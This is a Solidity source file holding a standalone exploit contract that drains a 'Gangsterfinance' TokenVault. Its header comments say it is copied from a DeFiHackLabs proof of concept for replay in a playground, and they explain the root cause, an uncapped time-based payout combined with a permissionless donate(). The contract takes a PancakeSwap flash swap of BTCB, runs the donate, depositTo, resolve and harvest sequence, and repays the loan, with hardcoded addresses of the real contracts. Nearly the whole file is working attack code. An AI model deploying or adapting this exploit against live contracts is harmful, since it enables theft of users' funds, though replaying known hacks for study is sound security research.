// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-06-Gangsterfinance).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), and the PancakeSwap flash-swap callback
// `pancakeCall` lives on the test itself) — there is no standalone exploit
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack (testExploit -> pancakeCall) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/Gangsterfinance_exp.sol.
//
// Root cause: TokenVault.distribute() releases an UNBOUNDED share of the drip
// pool because `profit = share * (now - lastPayout)` has no cap on the elapsed
// time, and the pool had sat idle for ~302 days. Combined with a permissionless
// donate() that does not exclude the donor from the resulting distribution, an
// attacker can flash-borrow BTCB, donate() into the drip pool, deposit a tiny
// stake to trigger distribute() (which dumps the ENTIRE stale-inflated pool into
// profitPerShare_), then resolve()+harvest() to reclaim far more than they put
// in — all funded by a free flash swap.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ITokenVault {
    function donate(uint256 _amount) external;
    function depositTo(address _user, uint256 _amount) external;
    function resolve(uint256 _amount) external;
    function harvest() external;
    function myTokens() external view returns (uint256);
}

contract GangsterfinanceDrain {
    address constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address constant CAKE_LP = 0x0b32Ea94DA1F6679b11686eAD47AA4C6bF38cd59;
    address constant TOKEN_VAULT = 0xe968D2E4ADc89609773571301aBeC3399D163c3b;

    uint256 borrowAmount = 1020000000000000000;

    // step 0: flash-borrow BTCB from the Pancake pair; the callback below does the drain.
    function run() external {
        IUniswapV2Pair(CAKE_LP).swap(borrowAmount, 0, address(this), new bytes(1));
    }

    // PancakeSwap flash-swap callback — performs the donate/deposit/resolve/harvest sequence.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        uint256 donateAmount = 1000000000000000000;
        uint256 depositAmount = 15720000000000000;
        uint256 repayAmount = 1022652000000000000;

        IERC20(BTCB).approve(address(TOKEN_VAULT), borrowAmount);

        ITokenVault(TOKEN_VAULT).donate(donateAmount);
        ITokenVault(TOKEN_VAULT).depositTo(address(this), depositAmount);
        ITokenVault(TOKEN_VAULT).resolve(ITokenVault(TOKEN_VAULT).myTokens());
        ITokenVault(TOKEN_VAULT).harvest();
        IERC20(BTCB).transfer(address(CAKE_LP), repayAmount);
    }
}
